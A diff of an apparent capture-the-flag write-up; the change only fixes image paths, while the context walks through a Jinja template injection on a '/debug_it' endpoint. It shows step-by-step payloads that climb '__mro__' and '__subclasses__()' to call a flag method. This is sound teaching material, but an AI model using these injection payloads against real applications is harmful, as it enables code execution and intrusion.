@@ -3,7 +3,7 @@
 
 1.  Looking at the source code of main page you can find `/debug_it` endpoint.
  
-![Html source code](images/1.png)
+![Html source code](../images/1.png)
 
 2. Part that interests us is here:
 ```python
@@ -35,25 +35,25 @@ We can see here that unsaintized IP is passed directly to the HTML
 {{request.__class__.__mro__}}
 ```
 
-![mro](images/2.png)
+![mro](../images/2.png)
 
 - Now we need to get subclasses of root Object
 ```jinja
 {{request.__class__.__mro__[11].__subclasses__()}}
 ```
 
-![sub](images/3.png)
+![sub](../images/3.png)
 
 - We have our Flag `(in my case it is 495th in array of subclasses)` class but we want to see it's methods:
 ```jinja
 {{request.__class__.__mro__[11].__subclasses__()[495].__dict__}}
 ```
 
-![dict](images/4.png)
+![dict](../images/4.png)
 
 - There it is! Now just access method `get_flag` directly:
 ```jinja
 {{request.__class__.__mro__[11].__subclasses__()[495].get_flag()}}
 ```
 
-![flag](images/5.png)
+![flag](../images/5.png)
